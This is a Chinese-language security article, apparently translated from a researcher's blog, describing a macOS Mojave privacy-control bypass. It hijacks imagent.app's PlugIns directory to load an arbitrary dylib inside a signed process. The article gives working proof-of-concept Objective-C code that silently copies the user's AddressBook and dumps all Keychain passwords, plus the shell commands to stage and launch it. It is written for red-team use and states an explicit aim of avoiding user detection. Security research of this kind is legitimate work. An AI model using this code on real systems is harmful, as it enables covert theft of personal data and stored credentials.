![0.jpg](https://image.3001.net/images/20191010/1570716372_5d9f3ad4c61f8.jpg!small)

## 写在前面的话

**在当前的红队研究项目中，我们经常会遇到各种各样的苹果设备。因此当每一个新的macOS版本引入了隐私或安全方面的更新时，我们都需要利用一些实用技术来浏览和了解苹果做了哪些修改。**

2018年底，苹果推出了macOS
Mojave，并引入了一种隐私限制机制，旨在应用程序请求访问敏感数据（如相机、麦克风、通讯簿和日历等）时向用户发出警告提示。而且通常情况下，红队研究人员参与的项目其核心之一就是在实现渗透的过程中不被检测到，因此我妈们就需要绕过这些安全控制来避免用户发现我们的行为，所以我们最不想看到的就是系统给用户弹出下面这种警告对话框：

![1.png](https://image.3001.net/images/20191010/1570716378_5d9f3adad20c4.png!small)

在这篇文章中，我们将给大家介绍一种绕过macOS隐私控制以及其他保护访问限制（例如Keychain等）的技术。

### macOS隐私控制机制概览

此前我就一直在想办法绕过Mojave的隐私控制机制，而且我也在思考第三方应用程序访问日历和通讯簿等功能时，操作系统是如何向用户显示隐私提示警告框的。更重要的是，我想知道苹果签名的应用程序如何能够访问这些功能而无需征得用户同意。

其实我想要寻找的答案都在TTC那里。TTC，即透明、许可和控制服务。除了沙箱之外，TTC还负责监控程序访问请求，并在请求受限资源时向用户发出警报。

我们可以看看下列行为：

    
    
    ls ~/Library/Calendars
    

除非你之前已经同意过让Terminal.app访问日历程序的话（可以使用命令“ttcutil reset
Calendar”来重置许可），否则系统将弹出下列警告框：

![2.png](https://image.3001.net/images/20191010/1570716387_5d9f3ae3c3963.png!small)

点击“不允许”后，你将会在控制台中看到请求应用错误的提示：

![3.png](https://image.3001.net/images/20191010/1570716393_5d9f3ae90a001.png!small)

查看控制面板中的“安全&隐私”配置项，你将会看到：

![4.png](https://image.3001.net/images/20191010/1570716415_5d9f3aff13d17.png!small)

有趣的是，在这个配置面板中，我们并没有看到Calendar.app的身影，我们使用codesign工具查看Calendar.app的权限时，信息如下：

    
    
    <key>com.apple.private.tcc.allow</key>
    
    <array>
    
        <string>kTCCServiceReminders</string>
    
        <string>kTCCServiceCalendar</string>
    
        <string>kTCCServiceAddressBook</string>
    
    </array>
    

这里，我们可以看到com.apple.private.tcc.allow的权限，如果应用该权限，我们就可以在不提示的情况下访问受保护的资源了。因此，每个需要访问的资源需要列在这个授权列表中，此时的Calendar.app就可以直接访问提醒、日历和通讯簿等功能了，而TCC不会向用户显示任何的隐私警告框。

不幸的是，我们不能直接用这种权限来给我们的应用程序签名，并添加到com.apple.private权限列表中，因为它们只对苹果签名的二进制文件有效，因此我们还需要寻找另一种方法。

## 如何实现？

自macOS
Mojave发布以来，网上已经有很多帖子讨论过这方面的内容了，其中的大部分方法都依赖于使用某种方式来控制那些以在该权限列表里的应用程序，但我们更倾向于使用其他方法来在目标应用程序中执行代码。

在本文中，我们将注意力放在macOS自带的imagent.app身上，这个应用程序位于/System/Library/PrivateFrameworks/IMCore.framework/imagent.app。查看该应用程序的权限之后，我们会发现一个非常有趣的事情。首先，我们看到它可以在无需提醒用户的情况下访问通讯簿：

    
    
    <key>com.apple.private.tcc.allow.overridable</key>
    
    <array>
    
            <string>kTCCServiceAddressBook</string>
    
    </array>
    

另外，我们还可以看到这个应用程序能够访问多个Keychain访问组：

    
    
    <key>keychain-access-groups</key>
    
    <array>
    
            <string>ichat</string>
    
            <string>apple</string>
    
            <string>appleaccount</string>
    
            <string>InternetAccounts</string>
    
            <string>IMCore</string>
    
    </array>
    

接下来，我们需要使用codesign工具来验证代码关联的验证标识：

    
    
    codesign -d --entitlements :- /System/Library/PrivateFrameworks/IMCore.framework/imagent.app -vv
    

执行之后，我们可以看到如下所示的嵌入式元数据：

    
    
    CodeDirectory v=20100 size=4066 flags=0x0(none) hashes=120+5 location=embedded
    

在找到合适的代理应用时需要注意的标识是library-validation，它代表只有由苹果签名的dylib或应用程序组ID才能被加载。运行时标识代表应用程序使用了强化的运行时环境，而这种情况降不允许我们将任意dylib加载到进程中。

如果这两个标识都不存在，我们就不必处理这些限制了。现在你可能在想，“我可以用dyldinsert库来加载我的dylib吗？”.嗯….不可以！苹果当然考虑过这一点，如果您查看<https://opensource.apple.com/source/dyld/dyld-655.1.1/src/dyld.cpp.auto.html>上的源代码，你

将看到，当存在授权时，通过环境变量加载dylib的任何尝试都会受到限制。

那么我们还有什么其他选择吗？通过分析imagent.app的结构，我们会看到一个PlugIns目录，它是为了在程序运行时加载扩展插件而设计的。由于我们的目标应用程序不需要用到已签名的dylib，因此我们有可能通过它来向已签名的进程中加载任意代码。

接下来，我们需要对二进制文件进行反编译，然后看看PlugIns目录是如何被使用的。

在寻找NSBundle引用时，我们找到了_loadServices方法：

![5.png](https://image.3001.net/images/20191010/1570716462_5d9f3b2e10c06.png!small)

我们可以看到插件Bundle必须包含的文件扩展名，以及函数加载Bundle的过程：

![6.png](https://image.3001.net/images/20191010/1570716467_5d9f3b33b80be.png!small)

接下来，我们需要创建一个插件，这里我直接找了一个现成的imservice插件来直接修改，插件路径为/System/Library/Messages/PlugIns。

拿到我们的插件之后，我们可以拷贝到一个可写入的路径：

`cp -r /System/Library/PrivateFrameworks/IMCore.framework /tmp/; cp -r
/System/Library/Messages/PlugIns/iMessage.imservice
/tmp/IMCore.framework/imagent.app/Contents/PlugIns/`

接下来我们需要创建要加载的dylib，在创建dylib时，我们将使用 **attribute**
（（constructor））描述符来确保在加载库时执行提供的代码，这样才能在不向用户显示提示框的情况下退出代理应用程序。例如：

    
    
    @implementation FunkyDylib :NSObject
    
    -(void)copyFilesFrom:(NSString *)src toPath:(NSString *)dst {
    
    NSFileManager *fileManager = [[NSFileManager alloc]init];
    
    [fileManager copyItemAtPath:src toPath:dst error:nil];
    
    }
    
    @end
    
    void runPOC(void) {
    
    [FunkyDylib alloc] copyFilesFrom:@"/Users/xpn/Library/Application Support/AddressBook" toPath:@"/tmp/AddressBook"];
    
    NSLog(@"[*] Copy complete, check /tmp/AddressBook for data");
    
    }
    
    __attribute__((constructor))
    
    static void customConstructor(int argc, const char **argv) {
    
    printf("IMCore PlugIns hijack POC by @_xpn_\n\n");
    
    runPOC();
    
    exit(0);
    
    }

编译完成后，我们可以直接替换iMessage.imservice现有的插件dylib：

    
    
    cp -f funky.dylib /tmp/IMCore.framework/imagent.app/Contents/PlugIns/iMessage.imservice/Contents/MacOS/iMessage
    

接下来，启动imagent：

    
    
    /tmp/IMCore.framework/imagent.app/Contents/MacOS/imagent
    

一切正常的话，此时将不会弹出警告框，而通讯簿的数据都将会被复制到/tmp中：

![7.png](https://image.3001.net/images/20191010/1570716486_5d9f3b463f19e.png!small)

## 访问Keychain

除了上面的效果之外，我们还可以将这项技术用到其他地方，比如说Keychain访问组：

![8.png](https://image.3001.net/images/20191010/1570716492_5d9f3b4ccd345.png!small)

接下来，我们尝试获取用户的Keychain凭证，这里需要使用[
_SecItemCopyMatching_](https://developer.apple.com/documentation/security/1398306-secitemcopymatching)方法来搜索凭证，并导出Keychain的所有属性，包括用户存储的密码：

    
    
    @implementation FunkyDylib :NSObject
    
    -(void)harvestKeychain {
    
    NSDictionary *query = @{
    
    (id)kSecClass: (id)kSecClassGenericPassword,
    
    (id)kSecReturnData: (id)kCFBooleanTrue,
    
    (id)kSecAttrSynchronizable: (id)kCFBooleanTrue,
    
    (id)kSecReturnAttributes: (id)kCFBooleanTrue,
    
    (id)kSecMatchLimit: (id)kSecMatchLimitAll
    
    };
    
    NSData *inData = nil;
    
    CFTypeRef inTypeRef = (__bridge CFTypeRef)inData;
    
    OSStatus status = SecItemCopyMatching((CFDictionaryRef)query, &inTypeRef);
    
    if(status != noErr)
    
    {
    
    printf("[!] Error with SecItemCopyMatching\n");
    
    return;
    
    }
    
    NSLog(@"[*] Dumping Wifi Creds from Keychain...\n\n");
    
    NSLog(@"%@", (__bridge id)inTypeRef);
    
    }
    
    @end
    
    void runPOC(void) {
    
    [[FunkyDylib alloc] harvestKeychain];
    
    }
    
    __attribute__((constructor))
    
    static void customConstructor(int argc, const char **argv) {
    
    printf("IMCore PlugIns hijack POC by @_xpn_\n\n");
    
    runPOC();
    
    exit(0);
    
    }

拷贝上述内容并覆盖之前创建的iMessage插件dylib，然后启动imagent：

![9.png](https://image.3001.net/images/20191010/1570716539_5d9f3b7b0797a.png!small)

最后，祝大家Happy Hunting:D!

 ***参考来源：[ _xpnsec_](https://blog.xpnsec.com/bypassing-macos-privacy-controls/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

